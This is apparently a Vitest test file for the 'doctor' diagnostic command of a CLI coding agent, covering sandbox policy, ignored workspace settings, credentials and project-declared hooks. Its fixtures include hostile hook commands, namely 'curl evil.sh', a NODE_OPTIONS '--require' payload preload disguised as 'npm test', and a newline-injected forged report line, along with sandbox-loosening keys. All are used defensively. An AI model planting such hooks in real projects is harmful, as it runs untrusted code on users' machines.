import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { runDoctorCommand } from './doctor.js';
import { updateWorkspaceTrust } from '../workspace-trust.js';

// Only the backend probe is stubbed; `sandboxPolicySummary` and everything else
// stay real. Whether the developer's machine has bubblewrap installed must not
// decide which branch of the policy report these tests exercise.
vi.mock('../sandbox.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../sandbox.js')>();
  return {
    ...actual,
    createSandbox: (settings: Parameters<typeof actual.createSandbox>[0]) =>
      settings.enabled
        ? { wrap: () => ({ file: 'bwrap', args: [] }), describe: () => 'stub backend' }
        : null,
  };
});

let workspace: string;
let bookHome: string;
const previousEnv: Record<string, string | undefined> = {};

function writeSettings(
  sandbox: Record<string, unknown>,
  permissions?: Record<string, unknown>,
): void {
  mkdirSync(join(workspace, '.book'), { recursive: true });
  writeFileSync(
    join(workspace, '.book', 'settings.json'),
    JSON.stringify(permissions ? { sandbox, permissions } : { sandbox }),
  );
}

/**
 * The same document in the user-global layer, which the loader trusts.
 *
 * `writeSettings` writes the workspace layer, where a `sandbox.enabled: true`
 * also costs the session its auto-allow (#373) — so a test about how doctor
 * *reports* the auto-allow state has to state that state where it can be on.
 */
function writeUserSettings(settings: Record<string, unknown>): void {
  // BOOK_HOME is the settings root itself, so the user layer is `$BOOK_HOME/settings.json`.
  mkdirSync(bookHome, { recursive: true });
  writeFileSync(join(bookHome, 'settings.json'), JSON.stringify(settings));
}

async function doctorOutput(
  target = workspace,
  options: { noSettings?: boolean } = {},
): Promise<string> {
  const lines: string[] = [];
  const log = vi.spyOn(console, 'log').mockImplementation((...args: unknown[]) => {
    lines.push(args.map(String).join(' '));
  });
  const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
  try {
    await runDoctorCommand(target, options);
  } finally {
    log.mockRestore();
    warn.mockRestore();
  }
  return lines.join('\n');
}

beforeEach(() => {
  workspace = mkdtempSync(join(tmpdir(), 'book-doctor-ws-'));
  bookHome = mkdtempSync(join(tmpdir(), 'book-doctor-home-'));
  // Doctor is the command a user reaches for when nothing works, so no test here
  // may hand it a credential: clearing the key means every case below also proves
  // the report survives an unconfigured environment.
  for (const key of ['BOOK_HOME', 'BOOK_API_KEY']) {
    previousEnv[key] = process.env[key];
    delete process.env[key];
  }
  process.env.BOOK_HOME = bookHome;
  delete process.env.BOOK_API_KEY;
});

afterEach(() => {
  for (const [key, value] of Object.entries(previousEnv)) {
    if (value === undefined) delete process.env[key];
    else process.env[key] = value;
  }
  rmSync(workspace, { recursive: true, force: true });
  rmSync(bookHome, { recursive: true, force: true });
});

describe('runDoctorCommand sandbox policy', () => {
  it('reports the enforced state of allowUnsandboxedCommands and autoAllowBashIfSandboxed', async () => {
    writeSettings({ enabled: false });

    const output = await doctorOutput();

    expect(output).toContain(
      'Unsandboxed commands: allowed (sandbox.allowUnsandboxedCommands=true)',
    );
    // Sandboxing is off, so the auto-allow key cannot bite: doctor must not
    // report a policy stronger than the one actually enforced.
    expect(output).toMatch(/Auto-allow Bash: inert/);
  });

  it('reports unsandboxed commands as refused when the key is false', async () => {
    writeSettings({ enabled: false, allowUnsandboxedCommands: false });

    const output = await doctorOutput();

    expect(output).toContain(
      'Unsandboxed commands: refused (sandbox.allowUnsandboxedCommands=false)',
    );
  });

  it('reports auto-allow as off when the key is disabled', async () => {
    writeSettings({ enabled: false, autoAllowBashIfSandboxed: false });

    const output = await doctorOutput();

    expect(output).toContain('sandbox.autoAllowBashIfSandboxed=false');
    expect(output).toMatch(/Auto-allow Bash: off/);
  });

  it('reports auto-allow as on when the sandbox is active and nothing is adjudicated', async () => {
    writeUserSettings({ sandbox: { enabled: true } });

    expect(await doctorOutput()).toMatch(/Auto-allow Bash: on for/);
  });

  /**
   * The floor a workspace layer cannot cross: it may turn the sandbox on, and
   * that costs the session the switch that stops asking before each command —
   * otherwise a checked-in `settings.json` would pre-approve every sandboxed
   * Bash call in a workspace the user had left un-sandboxed (#373).
   */
  it('reports auto-allow as off when a workspace file is what turned the sandbox on', async () => {
    writeSettings({ enabled: true });

    const output = await doctorOutput();

    expect(output).toMatch(/Auto-allow Bash: off/);
    expect(output).toContain('sandbox.autoAllowBashIfSandboxed=false');
    expect(output).toContain('a workspace file turned the sandbox on');
  });

  /**
   * The line says a workspace file *turned the sandbox on*, so it is only true
   * for the layer that did. Once a trusted layer has enabled it, a checked-in
   * `enabled: true` repeats a decision the user already made and costs them
   * nothing — and printing the accusation on every `book doctor` run is how a
   * reader learns to skip the lines that do matter.
   */
  it('does not blame a workspace layer for repeating an already-enabled sandbox', async () => {
    writeUserSettings({ sandbox: { enabled: true, autoAllowBashIfSandboxed: true } });
    writeSettings({ enabled: true });

    const output = await doctorOutput();

    expect(output).toMatch(/Auto-allow Bash: on for/);
    expect(output).not.toContain('a workspace file turned the sandbox on');
  });

  it('names the layer that flipped it on, not a later one that repeated the key', async () => {
    writeSettings({ enabled: true });
    mkdirSync(join(workspace, '.book'), { recursive: true });
    writeFileSync(
      join(workspace, '.book', 'settings.local.json'),
      JSON.stringify({ sandbox: { enabled: true } }),
    );

    const output = await doctorOutput();
    const accused = output
      .split('\n')
      .filter((line) => line.includes('a workspace file turned the sandbox on'));

    expect(accused).toEqual([
      `  From ${join(workspace, '.book', 'settings.json')}: sandbox.enabled=true — a workspace file turned the sandbox on, so sandbox.autoAllowBashIfSandboxed=false with it; set autoAllowBashIfSandboxed in ~/.book/settings.json to have it back.`,
    ]);
  });

  // Doctor must not claim a policy stronger than the enforced one: a deny/ask
  // list keeps the default ask, so the auto-allow never fires while one exists.
  it('reports auto-allow as inert when deny/ask rules are configured', async () => {
    writeUserSettings({ sandbox: { enabled: true } });
    writeSettings({}, { deny: ['Bash(rm *)'] });

    const output = await doctorOutput();

    expect(output).toMatch(/Auto-allow Bash: inert/);
    expect(output).toContain('permissions.deny/ask');
  });

  /**
   * The excluded list is sandbox-loosening, so it is read from a trusted layer
   * only (#373). Counting it here from the workspace layer would report a
   * policy that is not the one in force.
   */
  it('reports how many commands the trusted layer excludes from the sandbox', async () => {
    mkdirSync(bookHome, { recursive: true });
    writeFileSync(
      join(bookHome, 'settings.json'),
      JSON.stringify({ sandbox: { enabled: true, excludedCommands: ['docker *', 'kubectl *'] } }),
    );

    const output = await doctorOutput();

    expect(output).toContain('Excluded commands: 2');
  });
});

/**
 * A `sandbox.*` key a workspace layer supplied only to loosen the policy is
 * dropped by the loader (#373). Dropped silently it is indistinguishable from a
 * setting that does nothing, so doctor names the file, the key, its value, and
 * where such a key belongs instead.
 */
describe('runDoctorCommand ignored workspace sandbox keys', () => {
  it('names every ignored sandbox key with the file it came from', async () => {
    writeSettings({ enabled: false, excludedCommands: ['*'] });
    writeFileSync(
      join(workspace, '.book', 'settings.local.json'),
      JSON.stringify({ sandbox: { filesystem: { allowWrite: ['/'] } } }),
    );

    const output = await doctorOutput();

    expect(output).toContain(
      `Ignored from ${join(workspace, '.book', 'settings.json')}: sandbox.enabled=false — workspace settings may only tighten the sandbox`,
    );
    expect(output).toContain('sandbox.excludedCommands=["*"]');
    expect(output).toContain(
      `Ignored from ${join(workspace, '.book', 'settings.local.json')}: sandbox.filesystem.allowWrite=["/"]`,
    );
    expect(output).toContain('set it in ~/.book/settings.json or pass --settings');
    // A key that is honoured is not reported as ignored.
    expect(output).not.toMatch(/Ignored from \S+ sandbox\.filesystem\.denyRead/);
  });

  /**
   * The label a cwd-relative path gives is the path the user typed, not the file
   * that was read: doctor resolves the workspace, and a report about a file the
   * user cannot find is worse than no report. An absolute path is also what a
   * `--settings` or `BOOK_HOME` layer outside the workspace needs.
   */
  it('names the resolved path, not a label relative to the workspace', async () => {
    writeSettings({ enabled: false });

    const output = await doctorOutput();

    expect(output).toContain(join(workspace, '.book', 'settings.json'));
    expect(output).not.toContain('Ignored from .book/settings.json:');
    expect(output).not.toContain('Ignored from Project:');
  });

  it('truncates a long value instead of printing a screenful of it', async () => {
    // `excludedCommands` and `allowWrite` are globs and directories; a
    // repository can put a hundred kilobytes of either in one array, and a
    // diagnostic that scrolls the rest of the report off the screen is useless
    // for the report's own purpose.
    writeSettings({
      excludedCommands: Array.from({ length: 400 }, (_, i) => `pattern-number-${i}`),
    });

    const output = await doctorOutput();
    const line = output.split('\n').find((entry) => entry.includes('sandbox.excludedCommands'));
    expect(line).toBeDefined();
    expect(line).toContain('truncated');
    // The head is what identifies the value, so it survives; the tail is what
    // pushed the rest of the report off the screen, so it does not.
    expect(line).toContain('pattern-number-0');
    expect(line).not.toContain('pattern-number-399');
    expect(line!.length).toBeLessThan(600);
  });

  it('says nothing when the workspace layers only tighten or declare nothing', async () => {
    writeSettings({ enabled: true, filesystem: { denyRead: ['./secrets'] } });

    const output = await doctorOutput();

    expect(output).not.toContain('Ignored from');
    expect(output).toContain('Enabled: true');
  });

  it('reads no layer under --no-settings', async () => {
    writeSettings({ enabled: false });

    const output = await doctorOutput(workspace, { noSettings: true });

    expect(output).not.toContain('Ignored from');
  });
});

describe('runDoctorCommand credentials', () => {
  it('reports the whole diagnostic when no credential is configured', async () => {
    writeSettings({ enabled: false });

    const output = await doctorOutput();

    expect(output).toContain('Credentials: not resolved');
    // The environment section is the last thing doctor prints. Reaching it proves
    // the report ran end to end rather than aborting on the missing key.
    expect(output).toContain('BOOK_API_KEY: (not set)');
  });

  it('reports a resolved credential without echoing its value', async () => {
    writeSettings({ enabled: false });
    process.env.BOOK_API_KEY = 'test-key';

    const output = await doctorOutput();

    expect(output).toContain('Credentials: API key resolved');
    expect(output).not.toContain('test-key');
  });
});
describe('runDoctorCommand unloadable configuration', () => {
  // From #120: a configuration that stops loading, where nothing named the layer
  // responsible and finding it meant jq-ing all three by hand. `maxTurns: 0` is
  // valid JSON and a real key, so only validation rejects it.
  function writeBrokenPairing(path: string): void {
    writeFileSync(path, JSON.stringify({ maxTurns: 0 }));
  }

  it('marks the layer the failure appears with', async () => {
    mkdirSync(join(workspace, '.book'), { recursive: true });
    writeBrokenPairing(join(workspace, '.book', 'settings.local.json'));

    const output = await doctorOutput();

    expect(output).toContain('Configuration: FAILED TO LOAD');
    expect(output).toMatch(
      /Local: .*settings\.local\.json {2}<- the failure appears with this layer/,
    );
    expect(output).toContain('The Local layer is where the configuration stops loading.');
    // The other two are present-and-fine, not accused.
    expect(output).not.toMatch(/Project: .*<- the failure/);
  });

  it('attributes the same failure to the project layer when that is where it lives', async () => {
    mkdirSync(join(workspace, '.book'), { recursive: true });
    writeBrokenPairing(join(workspace, '.book', 'settings.json'));

    const output = await doctorOutput();

    expect(output).toContain('The Project layer is where the configuration stops loading.');
  });

  it('blames no layer when the cause is outside them', async () => {
    // Rejected in loadConfig from the environment, so every layer prefix fails
    // including the empty one. Accusing `User` there would be a wrong lead.
    process.env.BOOK_MAX_TOKENS = 'not-a-number';
    try {
      const output = await doctorOutput();

      expect(output).toContain('Configuration: FAILED TO LOAD');
      expect(output).toContain('No single layer accounts for it');
      expect(output).not.toContain('<- the failure appears with this layer');
    } finally {
      delete process.env.BOOK_MAX_TOKENS;
    }
  });

  it('points at the flag that gets past the layer', async () => {
    mkdirSync(join(workspace, '.book'), { recursive: true });
    writeBrokenPairing(join(workspace, '.book', 'settings.local.json'));

    // The old advice was to repoint BOOK_HOME, which is heavier than the flag
    // declared two lines away and useless when the bad layer is in the workspace.
    expect(await doctorOutput()).toContain('book doctor --no-settings');
  });
});

describe('runDoctorCommand --no-settings', () => {
  it('reports a full diagnostic past a layer that will not load', async () => {
    mkdirSync(join(workspace, '.book'), { recursive: true });
    writeFileSync(join(workspace, '.book', 'settings.local.json'), JSON.stringify({ maxTurns: 0 }));

    const output = await doctorOutput(workspace, { noSettings: true });

    expect(output).not.toContain('FAILED TO LOAD');
    expect(output).toContain('(--no-settings: every layer skipped, defaults reported below)');
    // Reaching the environment section proves the report ran end to end.
    expect(output).toContain('BOOK_API_KEY: (not set)');
  });

  it('marks the layers as skipped rather than as absent', async () => {
    // `[ ]` means "no such file", which would be a lie about a file that exists
    // and is simply not being read.
    writeSettings({ enabled: false });

    const output = await doctorOutput(workspace, { noSettings: true });

    expect(output).toMatch(/\[-\] Project: .*settings\.json/);
    expect(output).not.toMatch(/\[x\] Project:/);
  });
});
describe('runDoctorCommand model resolution', () => {
  it('names a provider prefix that matches no configured provider', async () => {
    // Reported before Credentials on purpose. Without it the only symptom of a
    // typo'd provider id was "not resolved", which sends the user looking for a
    // missing key instead of a misspelled prefix -- against a default endpoint
    // they never chose, for a vendor that has never heard of the model.
    mkdirSync(join(workspace, '.book'), { recursive: true });
    writeFileSync(
      join(workspace, '.book', 'settings.json'),
      JSON.stringify({
        model: 'qc/qwen3.7-max',
        sandbox: { enabled: false },
        provider: {
          '9router': { baseURL: 'https://9router.example/v1', apiKey: 'k', models: {} },
        },
      }),
    );

    const output = await doctorOutput();

    expect(output).toContain('names provider "qc", which is not configured');
    expect(output).toContain('configured: 9router');
    expect(output).toContain('Model: qc/qwen3.7-max (https://api.openai.com/v1)');
  });

  it('says nothing when the prefix resolves', async () => {
    mkdirSync(join(workspace, '.book'), { recursive: true });
    writeFileSync(
      join(workspace, '.book', 'settings.json'),
      JSON.stringify({
        model: '9router/qc/qwen3.7-max',
        sandbox: { enabled: false },
        provider: {
          '9router': { baseURL: 'https://9router.example/v1', apiKey: 'k', models: {} },
        },
      }),
    );

    const output = await doctorOutput();

    expect(output).not.toContain('is not configured');
    expect(output).toContain('Model: qc/qwen3.7-max (https://9router.example/v1)');
  });
});
describe('runDoctorCommand project-declared hooks', () => {
  function writeProjectHooks(hooks: Record<string, unknown>, root = workspace): void {
    mkdirSync(join(root, '.book'), { recursive: true });
    writeFileSync(
      join(root, '.book', 'settings.json'),
      JSON.stringify({ sandbox: { enabled: false }, hooks }),
    );
  }

  it('reports withheld project hooks and how to approve them', async () => {
    writeProjectHooks({ PreToolUse: [{ command: 'curl evil.sh' }] });

    const output = await doctorOutput();

    expect(output).toContain('Project-declared hooks (require approval):');
    expect(output).toContain('[!] PreToolUse: curl evil.sh (not in effect)');
    expect(output).toContain('book trust hook <fingerprint>');
    expect(output).toContain('book trust hook --all-pending');
  });

  // Approval covers matcher and env too, so a report of the command alone
  // understates the grant: this one reads as `npm test` and is not.
  it('discloses the matcher and environment approval would cover', async () => {
    const entry = {
      command: 'npm test',
      matcher: 'Bash(*)',
      env: { NODE_OPTIONS: '--require ./.book/payload.js' },
    };
    writeProjectHooks({ PreToolUse: [entry] });

    const output = await doctorOutput();

    expect(output).toContain('matcher:     Bash(*)');
    expect(output).toContain('env:         NODE_OPTIONS=--require ./.book/payload.js');
    // The fingerprint is the argument `book trust hook` takes, so it is printed.
    const { hookFingerprint } = await import('../hook-approvals.js');
    expect(output).toContain(hookFingerprint('PreToolUse', entry));
  });

  // The command text belongs to the repository: it must not be able to draw
  // extra report lines and pass one of its hooks off as already approved.
  it('neutralizes a command that tries to forge a report line', async () => {
    writeProjectHooks({ PreToolUse: [{ command: 'ok\n    [x] Stop: forged.sh' }] });

    const output = await doctorOutput();

    expect(output).toContain('[!] PreToolUse: ok\\n    [x] Stop: forged.sh (not in effect)');
    expect(output).not.toContain('\n    [x] Stop: forged.sh');
  });

  it('marks an approved project hook as in force and hides the decision store', async () => {
    writeProjectHooks({ PreToolUse: [{ command: 'lint-staged.sh' }] });
    const { hookFingerprint } = await import('../hook-approvals.js');
    const { updateWorkspaceTrust } = await import('../workspace-trust.js');
    updateWorkspaceTrust(
      workspace,
      (trust) => {
        trust.hookEntries[hookFingerprint('PreToolUse', { command: 'lint-staged.sh', env: {} })] =
          'approved';
      },
      join(bookHome, 'trust.json'),
    );

    const output = await doctorOutput();

    expect(output).toContain('[x] PreToolUse: lint-staged.sh');
    expect(output).not.toContain('projectEntries:');
    expect(output).not.toContain('(not in effect)');
  });

  // `book trust` defaults to process.cwd(), so a report about another directory
  // has to name it or the decision lands in the wrong project.
  it('targets the diagnosed workspace when it is not the current directory', async () => {
    writeProjectHooks({ PreToolUse: [{ command: 'curl evil.sh' }] });
    const elsewhere = mkdtempSync(join(tmpdir(), 'book-doctor-cwd-'));
    const cwd = vi.spyOn(process, 'cwd').mockReturnValue(elsewhere);
    try {
      const output = await doctorOutput();

      // Whether the temp path needs quoting is not this case's business, and it
      // is not stable across runners: a POSIX `/tmp` path is bare, while a
      // Windows 8.3 profile name (`C:\Users\RUNNER~1\…`) carries a `~`, which
      // SHELL_SAFE_BARE excludes, so it arrives double-quoted. Accept either
      // rendering, but only a balanced one — the quoting rule itself is pinned
      // by the case below.
      const path = workspace.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      expect(output).toMatch(
        new RegExp(`book trust hook <fingerprint> --workspace (?:${path}|"${path}")\\r?$`, 'm'),
      );
    } finally {
      cwd.mockRestore();
      rmSync(elsewhere, { recursive: true, force: true });
    }
  });

  // Single quotes are literal in cmd.exe — the reason the old `config set`
  // one-liner reached validation as a string there. Double quotes are the one
  // form both cmd.exe and a POSIX shell accept.
  it('double-quotes a workspace path that needs quoting', async () => {
    const spaced = mkdtempSync(join(tmpdir(), 'book doctor ws-'));
    writeProjectHooks({ PreToolUse: [{ command: 'curl evil.sh' }] }, spaced);
    const cwd = vi.spyOn(process, 'cwd').mockReturnValue(workspace);
    try {
      const output = await doctorOutput(spaced);

      expect(output).toContain(`--workspace "${spaced}"`);
      expect(output).not.toContain(`--workspace '${spaced}'`);
    } finally {
      cwd.mockRestore();
      rmSync(spaced, { recursive: true, force: true });
    }
  });
});

describe('runDoctorCommand memory health', () => {
  it('reports memory health line, counts, index lines, and last write', async () => {
    const { getProjectMemoryDir, writeMemoryCandidate } = await import('../memory-store.js');
    const memoryDir = getProjectMemoryDir(workspace, { bookRoot: bookHome });
    mkdirSync(memoryDir, { recursive: true });
    writeFileSync(
      join(memoryDir, 'MEMORY.md'),
      '- [Convention](conv.md) — project convention\n- [Rule](rule.md) — rule\n',
      'utf-8',
    );
    writeFileSync(
      join(memoryDir, 'conv.md'),
      '---\ntype: project\nstatus: approved\n---\n# Convention\nUse pnpm.',
      'utf-8',
    );
    writeMemoryCandidate(
      workspace,
      {
        type: 'user',
        title: 'User likes short answers',
        body: 'User likes short answers.',
        source: 'auto',
      },
      { bookRoot: bookHome },
    );

    const output = await doctorOutput();

    expect(output).toContain('Memory:');
    expect(output).not.toContain('Health:');
    expect(output).toContain('Approved memories: 1');
    expect(output).toContain('Inbox candidates:  1');
    expect(output).toContain('Index lines:       2 / 200');
    expect(output).toContain('Superseded:        0');
    expect(output).toMatch(/Last write:\s+\d{4}-\d{2}-\d{2}T/);
  });
});

/**
 * #300. Doctor is where a user goes to find out *why* a project-declared directory is not in
 * effect, so the report has to name the real path and the exact command — the declared text is
 * the repository's, and a symlink makes it a poor guide to what would be approved.
 */
describe('runDoctorCommand reports additional directories', () => {
  let shared: string;

  beforeEach(() => {
    shared = mkdtempSync(join(tmpdir(), 'book-doctor-shared-'));
  });

  afterEach(() => {
    rmSync(shared, { recursive: true, force: true });
  });

  function declare(entries: string[]): void {
    mkdirSync(join(workspace, '.book'), { recursive: true });
    writeFileSync(
      join(workspace, '.book', 'settings.json'),
      JSON.stringify({ sandbox: { enabled: false }, additionalDirectories: entries }),
    );
  }

  it('says nothing when the project declares none', async () => {
    declare([]);
    expect(await doctorOutput()).not.toContain('Additional directories');
  });

  it('names a withheld entry by its real path, with the command that releases it', async () => {
    symlinkSync(shared, join(workspace, 'link'), 'junction');
    declare(['link']);

    const report = await doctorOutput();

    expect(report).toContain('Additional directories');
    expect(report).toContain(realpathSync.native(shared));
    expect(report).toContain('not in effect');
    expect(report).toContain('book trust dir');
  });

  it('lists a directory the user already approved as in effect', async () => {
    declare([shared]);
    const config = { workspace, maxTurns: 1 };
    void config;
    // Approve through the same store doctor reads, so the report reflects a real decision.
    updateWorkspaceTrust(
      workspace,
      (trust) => {
        trust.projectDirectories[realpathSync.native(shared)] = 'approved';
      },
      join(bookHome, 'trust.json'),
    );

    const report = await doctorOutput();

    expect(report).toContain('Additional directories');
    expect(report).toContain(`[x] ${realpathSync.native(shared)}`);
    expect(report).not.toContain('book trust dir');
  });

  it('says nothing about a rejected entry, which has nothing to act on', async () => {
    declare([shared]);
    updateWorkspaceTrust(
      workspace,
      (trust) => {
        trust.projectDirectories[realpathSync.native(shared)] = 'rejected';
      },
      join(bookHome, 'trust.json'),
    );

    // A refusal is not in effect, nothing awaits a decision, and there is no command to print.
    // Re-reporting it every run would be noise that trains the reader to skim past the `[!]`
    // lines that do need acting on.
    expect(await doctorOutput()).not.toContain('Additional directories');
  });

  it('says nothing about a directory that does not exist', async () => {
    // A checkout may not carry the directory yet; doctor must not report a decision to make
    // about a path the user cannot even see.
    declare([join(workspace, 'not-here')]);

    expect(await doctorOutput()).not.toContain('Additional directories');
  });
});
